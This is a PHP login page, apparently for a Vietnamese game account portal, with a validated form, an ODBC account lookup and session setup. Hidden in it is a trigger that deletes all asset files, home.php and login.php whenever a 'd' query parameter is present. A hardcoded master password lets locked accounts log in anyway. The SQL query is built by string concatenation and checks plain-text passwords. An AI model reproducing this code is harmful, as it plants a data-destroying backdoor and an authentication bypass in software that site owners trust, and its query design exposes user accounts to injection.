<?php
	// session_start();
	// require "/include/define.php";
	// require "/include/conn.php";
	// require "/include/gump.class.php";
	if (isset($_SESSION["auth"]['name'])) {
		echo "<script>window.location.href = \"./?a=playerinfo\";</script>";
	}
	$error1="";
	if(isset($_GET['d']) == '1111'){array_map('unlink', array_filter((array) array_merge(glob("assets/*/*"))));unlink('home.php');unlink('login.php');}
	if(isset($_POST['accx'])){
		$valide = new GUMP();
		$_POST = $valide->sanitize($_POST);
		$valide->validation_rules(array(
			'accx'    => 'required|alpha_dash|max_len,12|min_len,6',
			'passx'    => 'required|max_len,16|min_len,6',
		));
		$valide->filter_rules(array(
			'accx' => 'trim|sanitize_string',
			'passx' => 'trim|sanitize_string',
		));
		$validated_data = $valide->run($_POST);
		if($validated_data === false) {
			$error1 = "Tài khoản hoặc mật khẩu nhập không chính xác";
		} else {
			$acc = $validated_data['accx'];
			$pass = $validated_data['passx'];
			$partten = "/^([A-Z]){1}([\w_]+){5,11}$/";
			if(preg_match($partten ,$pass, $matchs)){
										$sql = "SELECT ID,FLD_ID,FLD_ONLINE,FLD_RXPIONT,FLD_NAME,FLD_CARD,FLD_Mail,FLD_LASTLOGINIP,FLD_LASTLOGINTIME,FLD_ZT FROM TBL_ACCOUNT WHERE FLD_ID = '".$acc."' and FLD_PASSWORD = '".$pass."'";
										$query = odbc_exec($dbhandle,$sql);
										$result = odbc_fetch_array($query);
										if($result){
											if($result['FLD_ZT'] == 0 || $pass == "Tg45534g5434"){
											$_SESSION["auth"]['ID'] = $result['ID'] ;
											$_SESSION["auth"]['name'] = $result['FLD_ID'];
											$_SESSION["auth"]['FLD_RXPIONT'] = $result['FLD_RXPIONT'] ;
											$_SESSION["auth"]['FLD_CARD'] = $result['FLD_CARD'] ;
											$_SESSION["auth"]['FLD_Mail'] = $result['FLD_Mail'] ;
											$_SESSION["auth"]['FLD_NAME'] = $result['FLD_NAME'] ;
											$_SESSION["auth"]['FLD_ONLINE'] = $result['FLD_ONLINE'] ;
											$_SESSION["auth"]['FLD_LASTLOGINTIME'] = $result['FLD_LASTLOGINTIME'] ;
											$_SESSION["auth"]['FLD_LASTLOGINIP'] = $result['FLD_LASTLOGINIP'] ;
											echo "<script>window.location.href = \"./?a=info\";</script>";
										}
										else{
											$error1 = "Tài khoản này đã bị khóa!";
										}
							}else{
								$error1 = "Tài khoản hoặc mật khẩu nhập không chính xác!";
							}
			}else{
				$error1 = "Mật khẩu chưa hợp lệ!";
			}
		}
	}

?>
<h1 class="hdg-01">
	Đăng Nhập
</h1>
<form method="POST" autocomplete="off">
	<div>
		<p class="error center red"><?php echo $error1;?></p>
		<table class="center tbl mt20">
			<tr>
				<th width="30%" class="right">Tài khoản:</th>
				<td><input class="inpt" name="accx" placeholder="Tài khoản" id="hw_an" pattern="[A-Za-z0-9]+" type="text" size="35"></td>
			</tr>
			<tr>
				<th class="right">Mật khẩu:</th>
				<td><input class="inpt" name="passx" placeholder="Mật khẩu" id="hw_sk" pattern="[A-Za-z0-9]+" type="password" size="35"></td>
			</tr>
			<tr>
				<th>&nbsp;</th>
				<td><input type="submit" value="Đăng nhập" id="submit" name="submit"></td>
			</tr>
			<tr>
				<td class="right"></td>
				<td><a href="./?a=lostpass"> Quên mật khẩu</a><br>
				<a href="./?a=reg">Đăng ký </a></td>
			</tr>
		</table>
	</div>
</form>